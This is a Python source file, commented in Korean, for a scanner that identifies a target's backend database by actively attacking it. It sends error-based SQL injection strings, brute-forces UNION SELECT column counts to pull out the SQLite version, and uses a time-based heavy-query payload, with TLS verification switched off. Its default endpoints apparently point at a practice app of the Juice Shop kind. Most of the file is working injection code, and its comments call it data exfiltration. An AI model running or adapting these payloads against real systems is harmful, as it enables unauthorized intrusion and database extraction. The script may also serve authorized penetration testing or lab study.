import requests
import time
import logging
import re
from typing import List, Dict, Any, Set
from urllib.parse import urljoin, quote

logger = logging.getLogger(__name__)

# 전역 설정
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DEFAULT_TIMEOUT = 10

def debug_print(msg):
    print(f"[DEBUG-TECH] {msg}")

def detect_backend_technologies(target_url: str, known_endpoints: List[str] = None) -> List[Dict[str, Any]]:
    """
    백엔드 심층 탐지 + 버전 정밀 추출 (Data Exfiltration)
    """
    # 안전장치: 함수 내부에서 상수 재정의
    current_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    
    debug_print(f"Starting analysis for: {target_url}")
    
    technologies: List[Dict[str, Any]] = []
    detected_keys: Set[str] = set()
    session = requests.Session()
    session.headers.update({"User-Agent": current_user_agent})
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    def add_tech(product: str, version: str = "Unknown", category: str = "backend", source: str = "Unknown"):
        # 이미 등록된 기술이라도 버전이 'Unknown'이고 새 정보가 구체적이면 업데이트
        key = f"{product}" # 키를 제품명으로만 관리하여 업데이트 가능하게 함
        
        # 기존에 찾은게 있는지 확인
        existing = next((item for item in technologies if item["product"] == product), None)
        
        if existing:
            if existing["version"] == "Unknown" and version != "Unknown":
                existing["version"] = version
                existing["source"] = source
                logger.info(f"[TECH-DETECT] Updated {product} version to {version}")
                debug_print(f"!!! UPDATE !!! {product} version -> {version} via {source}")
        else:
            technologies.append({
                "name": product, "product": product, "version": version, "category": category, "source": source
            })
            detected_keys.add(key)
            logger.info(f"[TECH-DETECT] Found {product} via {source}")
            debug_print(f"!!! FOUND !!! {product} ({version}) via {source}")

    # --------------------------------------------------------------------------
    # [NEW] SQLite 버전 추출 함수 (Marker 추가 버전)
    # --------------------------------------------------------------------------
    def try_extract_sqlite_version(vuln_url: str):
        debug_print(f"--> Attempting to extract SQLite version from: {vuln_url}")
        
        base_url = vuln_url.split('?')[0] if '?' in vuln_url else vuln_url
        
        for col_count in range(1, 10):
            cols = [f"'{i}'" for i in range(1, col_count + 1)]
            
            # [핵심] 마커를 붙여서 헷갈리지 않게 함
            # SQLite 문자열 연결 연산자는 || 입니다.
            if col_count >= 2:
                cols[1] = "'VER:' || sqlite_version() || ':END'"
            else:
                cols[0] = "'VER:' || sqlite_version() || ':END'"
                
            payload_str = ",".join(cols)
            payload = f"') UNION SELECT {payload_str}--"
            
            try:
                full_attack_url = f"{base_url}?q={quote(payload)}"
                resp = session.get(full_attack_url, timeout=5, verify=False)
                
                # [핵심] 마커(VER:...:END)를 기준으로 추출
                match = re.search(r"VER:(.*?):END", resp.text)
                if match:
                    found_ver = match.group(1)
                    debug_print(f"    [EXPLOIT SUCCESS] Columns: {col_count} | Version: {found_ver}")
                    add_tech("SQLite", version=found_ver, category="database", source="Union-Based SQLi (Verified)")
                    return True
            except: pass
        return False

    # ==============================================================================
    # 1. 대상 엔드포인트 선정
    # ==============================================================================
    critical_defaults = [
        "/rest/products/search",
        "/api/Products/1", 
        "/api/Feedbacks",
        "/api/login"
    ]
    
    discovered = []
    if known_endpoints:
        discovered = [ep for ep in known_endpoints if 'api' in ep or 'rest' in ep][:3]
    
    final_targets = []
    for path in critical_defaults: final_targets.append(urljoin(target_url, path))
    for ep in discovered:
        if ep.startswith("http"): final_targets.append(ep)
        else: final_targets.append(urljoin(target_url, ep))
    final_targets = list(set(final_targets))
    
    debug_print(f"Target endpoints ({len(final_targets)}): {final_targets}")

    # ==============================================================================
    # 2. 공격 실행
    # ==============================================================================
    killer_payloads = ["'", "'))--", "' OR 1=1--"]
    time_payloads = {
        "SQLite": ["' OR (SELECT count(*) FROM sqlite_master AS T1, sqlite_master AS T2, sqlite_master AS T3) OR '"]
    }

    for full_url in final_targets:
        debug_print(f"--> Testing Endpoint: {full_url}")
        
        # 이미 버전을 찾았으면 중단
        sqlite_tech = next((t for t in technologies if t['product'] == 'SQLite'), None)
        if sqlite_tech and sqlite_tech['version'] != "Unknown": break

        # [전략 A] Killer Payloads & Version Extraction
        for payload in killer_payloads:
            try:
                # URL 생성
                if '?' in full_url: attack_url = f"{full_url}&q={quote(payload)}"
                else: attack_url = f"{full_url}?q={quote(payload)}"
                
                resp = session.get(attack_url, timeout=5, verify=False)
                content = resp.text
                err_msg = ""
                try: err_msg = str(resp.json())
                except: pass

                # 탐지 로직
                found_sqlite = False
                if 'SQLITE' in err_msg.upper() or 'SQLITE' in content.upper():
                    add_tech("SQLite", category="database", source=f"Error (Killer Payload)")
                    found_sqlite = True
                
                # 탐지되었다면 즉시 버전 추출 시도
                if found_sqlite:
                    try_extract_sqlite_version(full_url)
                    
            except: pass

        # [전략 B] Time-Based Check (버전 추출이 안됐을 때만)
        if any(t['name'] == 'SQLite' for t in technologies): continue

        for db, payloads in time_payloads.items():
            for payload in payloads:
                try:
                    start = time.time()
                    session.get(full_url, timeout=5, verify=False)
                    normal_time = time.time() - start
                    
                    if '?' in full_url: attack_url = f"{full_url}&q={quote(payload)}"
                    else: attack_url = f"{full_url}?q={quote(payload)}"

                    start = time.time()
                    session.get(attack_url, timeout=10, verify=False)
                    attack_time = time.time() - start
                    
                    if attack_time > normal_time + 2.0:
                        debug_print(f"    !!! TIME DELAY DETECTED !!!")
                        add_tech(db, category="database", source=f"Time-Based Injection")
                        break
                except: pass

    debug_print(f"Analysis finished. Found: {len(technologies)} techs")
    return technologies
